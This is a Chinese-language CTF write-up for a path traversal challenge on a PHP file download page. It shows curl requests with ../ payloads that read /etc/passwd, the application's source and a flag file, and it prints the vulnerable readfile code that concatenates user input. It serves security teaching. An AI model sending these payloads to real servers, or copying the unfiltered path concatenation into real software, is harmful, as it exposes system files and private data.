# 24-path-download-traversal

## 题目信息

- 类型：Web / 任意文件读取 / Path Traversal
- Flag：`TOGOGO-flag{}`

## 解题思路

打开首页可以看到这是一个文件下载中心，页面给了几个下载链接：

```text
/?file=report_a.txt
/?file=report_b.txt
/?file=summary.txt
```

页面还提示文件根目录是：

```text
/var/www/uploads/
```

所以后端大概率类似这样拼接路径：

```php
/var/www/uploads/ + 用户传入的 file
```

如果没有过滤 `../`，就可以用路径穿越跳出 uploads 目录，读取系统上的其他文件。

## 手工复刻

### 1. 访问正常文件

```bash
curl -i 'http://目标地址/?file=report_a.txt'
```

能看到正常文件内容：

```text
Sample report A - 2024Q1
```

说明 `file` 参数就是下载文件名。

### 2. 测试路径穿越

尝试读取 `/etc/passwd`：

```bash
curl -i 'http://目标地址/?file=../../../../etc/passwd'
```

如果返回类似下面内容，说明路径穿越成功：

```text
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

### 3. 读取源码验证漏洞

因为页面在 `/var/www/html/index.php`，而下载根目录在 `/var/www/uploads/`，所以可以用：

```bash
curl -i 'http://目标地址/?file=../html/index.php'
```

源码关键点：

```php
$base = '/var/www/uploads/';
$name = $_GET['file'];
$path = $base . $name;
readfile($path);
```

这里直接拼接了用户输入，没有过滤 `../`。

### 4. 拿 flag

CTF 常见 flag 在根目录 `/flag.txt`。

从 `/var/www/uploads/` 跳到 `/flag.txt`，payload：

```text
../../../../flag.txt
```

执行：

```bash
curl 'http://目标地址/?file=../../../../flag.txt'
```

得到：

```text
TOGOGO-flag{}
```
